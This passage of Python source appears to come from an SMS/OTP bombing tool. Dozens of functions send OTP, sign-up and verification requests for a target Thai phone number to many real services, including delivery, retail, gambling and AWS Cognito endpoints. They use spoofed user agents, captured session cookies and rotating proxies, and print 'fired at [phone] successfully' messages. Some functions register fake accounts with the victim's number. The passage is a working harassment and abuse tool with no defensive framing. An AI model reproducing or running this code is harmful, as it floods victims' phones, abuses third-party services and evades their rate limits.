	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api-sso.ch3plus.com/user/request-otp",headers={'user-agent': generate_user_agent()},json={"tel":phone,"type":"login"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api30(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.cmtrade.com/api/v2/account/sms/code",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA_204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gat_gtag_UA_204031796_2=1; _ga_39RBNN0V78=GS1.1.1664304861.1.0.1664304862.0.0.00","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept": "application/json, text/javascript, */*; q=0.01"},data=f"phone={phone}&countryCode=66&countryId=Thailand&type=mobile",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api31(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	SEND  = Session()
	API_WEB = SEND.get('https://www.bigthailand.com/login',headers={"user-agent": generate_user_agent()}).text
	SEND_TOKEN = bs(API_WEB,'html.parser')
	TOKEN = SEND_TOKEN.find("input",attrs={"name":"auth._token.local"})
	r = SEND.post("https://www.bigthailand.com/authentication-service/user/OTP",headers={"user-agent": generate_user_agent(),"authorization": f"Bearer {TOKEN}['value']","content-type": "application/json;charset=UTF-8","cookie": f"""auth.strategy=local; auth._token.local=Bearer%20{TOKEN}['value]; _pk_ref.564990563.2c0e=%5B%22google%22%2C%22%22%2C1664004463%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990563.2c0e=*; _gcl_au=1.1.1986299425.1664004463; _cdp_cfg=1; _asm_visitor_type=n; _ac_au_gt=1664004464356; _gid=GA1.2.681823710.1664004464; _gat_UA-165856282-1=1; popupTimeStamp=%7B%22popupIdx%22%3A0%2C%22expiredAt%22%3A%222022-09-24T07%3A57%3A43.685Z%22%7D; _asm_uid=890390276; cdp_session=1; _fbp=fb.1.1664004464406.202179650; _ga=GA1.2.2004890464.1664004464; _gac_UA-165856282-1=1.1664004466.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; isiframeenabled=true; _tt_enable_cookie=1; _ttp=fb53a55e-7e89-482c-8dcc-7d65cc3a9d43; _gcl_aw=GCL.1664004467.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; bigthailand-_zldp=OM%2F3Rx7iTnXlJ%2BG06WL7xCVOFTKwr0NmKdBzRqdYXCGLMGKJRuNpNfzZ9I3mvVMsodoRkLyJC2Y%3D; bigthailand-_zldt=93ed1974-6077-46c9-80b4-5d8af7b21d11-2; _ga_80VN88PBVD=GS1.1.1664004463.1.1.1664004470.53.0.0; _pk_id.564990563.2c0e=0.1664004463.1.1664004484.1664004463.; _ac_client_id=890389481.1664004485; _ac_an_session=zmzmzmzjzmzgzmzmzizjzdzrzqzjzgzrzqznzrzizdzizlzlznzjzjznznzrzmzdzizdzizlzlznzjzjznznzrzmzdzizlzlznzjzjznznzrzmzdzizdzgzjzizdzjzd2h25zdzgzdznzkzmzqzrzd; au_id=890389481; OptanonAlertBoxClosed=2022-09-24T07:28:08.466Z; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Sep+24+2022+14%3A28%3A08+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.33.0&isIABGlobal=false&hosts=&consentId=47109f59-44b2-40f3-b0c9-4e0b0c8cd8a9&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0007%3A1"""},json={"locale":"th","phone":f"+66{phone[1:]}","email":"asjfgyfg2@hbsfsdf.sdf","userParams":{"buyerName":"sfiushjud fusdhfus","activateLink":"www.google.com"}},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")

def api32(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]},proxies={'http': 'http://' + random.choice(s)})
	r = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api33(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api34(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api35(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.msport1688.com/auth/otp_sender",headers={"content-type": "application/x-www-form-urlencoded","cookie": "msp_ss_client=nin5curi8elq4364dlslffs5ennnv8oo; _ga=GA1.1.867791689.1664019874; _ga_1YLLB0C2FF=GS1.1.1664019873.1.1.1664019875.0.0.0","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")

def api36(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": generate_user_agent(),"accept": "application/json, text/plain, */*"},json={"phonenumber":phone,"language":"th"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api37(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api38(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://chobrod.com/register",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","x-requested-with": "XMLHttpRequest","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","cookie": ".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8AbF96Heci1NnsIpfhXCcZq_1dcnjr3wJH7IbyuvXx7JO98q0olmE5QQ09sRX3ts4f0snXBgp8hKG68ehlSJxRKG2BLY2Wj9z-AV6rmiU8RDNlEhHozm-R_ZGKSEbQSycbX455ffFuyBSw7fAUE-9M8; CHOBROD_SERVERID=051_30886; referrerCheckingGA=https://www.google.com/; _ga=GA1.2.684081299.1664700698; _gid=GA1.2.1610639645.1664700698; _gat_UA-88971742-1=1; sidchobrod=m08SOd7CyVuruAdw6iJ6fiZ9Sdm1V90G; usidchobrod=EENsATLoK7OnvSeYvnOuhOEJfl2zllCK; G_ENABLED_IDPS=google; _fbp=fb.1.1664700699743.423276722; GuildId=615af95c-99ca-48ba-bf8c-39a6638a708e; _ga_D11BPJ59QV=GS1.1.1664700697.1.1.1664700735.0.0.0"},data=f"ReturnUrl=%2F&UserName={phone}&Displayname=asssdad+sadass&CityId=1&&Captcha=F9UR",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")

def api39(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=")
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api40(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.fairdee.co.th/profile/request-otp",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "mp_184c9deb723214f5772e9320157cb5b9_mixpanel=%7B%22distinct_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24device_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; WZRK_G=a566c075343f4d118e2b0f35111f6f22; WZRK_S_69W-676-R46Z=%7B%22p%22%3A1%2C%22s%22%3A1665301546%2C%22t%22%3A1665301545%7D; _ga=GA1.3.837932271.1665301552; _gid=GA1.3.1240970639.1665301552; _gat=1; _gcl_au=1.1.1486581940.1665301553; _gat_gtag_UA_116460668_3=1; ajs_anonymous_id=578a9b90-fec5-409e-9b9e-60461e79d2a8; _fbp=fb.2.1665301553007.478015998","accept": "application/json, text/plain, */*"},json={"username":phone,"username_type":"phone","intent":"signup","is_email_otp":'false'},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api41(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://admin-api.24fix.tech/auth/otp/request",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},json={"phoneNumber":phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api42(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.ctrueshop.com/member.php?page=25&type=9",headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","content-type": "application/x-www-form-urlencoded","cookie": "PHPSESSID=1po9v1nrrem5fr8co6urk37lv1; _gcl_au=1.1.867007754.1665302231; _ga=GA1.2.1978432786.1665302231; _gid=GA1.2.1842911343.1665302231; _gat_gtag_UA_19183081_1=1; __sdwc=0978bae8-1717-4f1b-9f1a-dcf9dce81fa8; rchatbox:checkCrossOriginWebdata=1665302236917","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},data=f"tel1={phone}&affiliate=2&social=",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api43(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api44(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.get(f"https://4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com/dev/request-otp/+66{phone[1:]}",headers={"authority": "4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api45(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.ctrueshop.com/member.php?page=25&type=9",headers={"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","content-type": "application/x-www-form-urlencoded","cookie": "PHPSESSID=1po9v1nrrem5fr8co6urk37lv1; _gcl_au=1.1.867007754.1665302231; _ga=GA1.2.1978432786.1665302231; _gid=GA1.2.1842911343.1665302231; _gat_gtag_UA_19183081_1=1; __sdwc=0978bae8-1717-4f1b-9f1a-dcf9dce81fa8; rchatbox:checkCrossOriginWebdata=1665302236917","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},data=f"tel1={phone}&affiliate=2&social=",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api46(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = get(f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api47(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.giztix.com/graphql",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},json={"operationName":"OtpGeneratePhone","variables":{"phone":f"66{phone[1:]}"},"query":"mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api48(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://trainflix-api.xeersoft.co.th/api/otpphone/register",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/plain, */*","Content-Type": "application/json"},json={"numberphone": phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api49(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://dso.panggame.com/1/verify/send",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.1204499527.1666053101;_gcl_au=1.1.1227846426.1666053101;_fbp=fb.1.1666053101625.1278839242;_ga_2THGVDHQ7D=GS1.1.1666053101.1.1.1666053106.55.0.0;buttMsg=1666053125212"},json={"verify_source":1,"verify_type":1,"phone":f"{phone[1:]}","areacode":"66"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
		
def api50(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://admin-api.24fix.tech/auth/otp/request",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"},json={"phoneNumber":phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api51(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api52(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://kaspy.com/sms_63Vswc5dWk/sms.php/",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Cookie": "PHPSESSID=mvqfmd1daih60ep28gj9nrn04s; __atssc=google%3B1; __atuvc=2%7C42; __atuvs=634df68d89321b08001; private_content_version=93eb667db1caa66571dcb26591913a1e; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=fSk22U7uobzfYUUe; section_data_ids=%7B%22cart%22%3A1666053825%2C%22messages%22%3A1666053825%2C%22customer%22%3A1666053825%2C%22compare-products%22%3A1666053825%2C%22last-ordered-items%22%3A1666053825%2C%22directory-data%22%3A1666053825%2C%22captcha%22%3A1666053825%2C%22instant-purchase%22%3A1666053825%2C%22persistent%22%3A1666053825%2C%22review%22%3A1666053825%2C%22wishlist%22%3A1666053825%2C%22chatData%22%3A1666053816%2C%22recently_viewed_product%22%3A1666053825%2C%22recently_compared_product%22%3A1666053825%2C%22product_data_storage%22%3A1666053825%2C%22paypal-billing-agreement%22%3A1666053825%7D; _ga=GA1.2.1819946247.1666053827; _gid=GA1.2.2014825757.1666053827; _gat=1; mage-messages="},data=f"phoneVerifyFromSites={phone}",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
			
def api53(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://davyjones.mrwed.cloud/customer/register/get-otp",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"countryCode":"TH","phoneNumber":phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api54(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.put(f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",headers={"content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"method":"register"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")

def api55(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://m-api.hhh-st1.xyz/api/otp/register",headers={"content-type": "application/json","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"},json={"applicant":phone,"serviceName":"hihuay.com"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api56(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://services.eventpass.co/eventpass-accounts/otp/send",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/json"},json={"send_to":phone,"send_otp_type":"mobile","otp_type":"register"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api57(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.sabuyebuy.com/wp-json/api/v3/send-otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","accept": "application/json, text/plain, */*","content-type": "application/json"},json={"first_name":"Sodmms","last_name":"Somxns","address":"","birthday":"","phone":phone,"commissions_id":"","email_address":"Sujsks929@krkds.sksks","password":"as257400","agreements":"true","uuid":"c31fa698-c78c-4c33-8b78-bf1692df88c4","affiliate_id":0},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api58(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.best-inc.co.th/account/sendlogincode",headers={"content-type": "application/x-www-form-urlencoded","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"},data=f"phoneNumber=%22{phone}%22")
	if r.status_code == 200 or r.status_code == 201:
		printx(f"ยิงไปที่ {phone} สำเร็จ")
	
def api59(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
